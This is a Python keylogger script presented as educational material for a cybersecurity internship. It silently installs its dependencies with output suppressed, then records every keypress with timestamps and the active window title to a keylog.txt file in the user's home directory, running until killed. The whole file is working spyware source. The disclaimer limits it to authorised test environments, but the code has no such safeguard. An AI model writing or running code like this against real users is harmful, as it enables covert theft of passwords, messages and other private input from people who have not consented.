"""
DISCLAIMER:
This script is for EDUCATIONAL USE ONLY as part of a Cybersecurity Internship.
Unauthorized use is strictly prohibited. Use only in isolated and authorized test environments.
"""

import os
import sys
import subprocess
import time
from datetime import datetime
import platform

# -- Auto Install Required Modules --
def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(1)

install_and_import("keyboard")
install_and_import("psutil")

if platform.system() == "Windows":
    install_and_import("pygetwindow")
elif platform.system() == "Darwin":
    install_and_import("pyobjc-framework-Quartz")
elif platform.system() == "Linux":
    # Assume xdotool is installed via apt/yum (notify if not)
    pass

# --- Imports after install ---
import keyboard
import psutil
import platform

# Cross-platform window grabbing
def get_active_window_title():
    try:
        if platform.system() == "Windows":
            import pygetwindow as gw
            return gw.getActiveWindowTitle()
        elif platform.system() == "Darwin":
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        elif platform.system() == "Linux":
            import subprocess
            win = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname'])
            return win.decode('utf-8').strip()
    except Exception:
        return "[Unknown Window]"

# Log file path
log_file = os.path.expanduser("~\\keylog.txt") if platform.system() == "Windows" else os.path.expanduser("~/keylog.txt")

# Initialize log
with open(log_file, "a") as f:
    f.write(f"\n\n[+] Logger started at {datetime.now()}\n")

last_window = ""

# Log keystrokes and window changes
def log_key(event):
    global last_window
    current_window = get_active_window_title()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(log_file, "a") as f:
        if current_window != last_window:
            f.write(f"\n[{now}] -- Active Window: {current_window}\n")
            last_window = current_window
        f.write(f"[{now}] Key: {event.name}\n")

keyboard.on_press(log_key)
keyboard.wait()
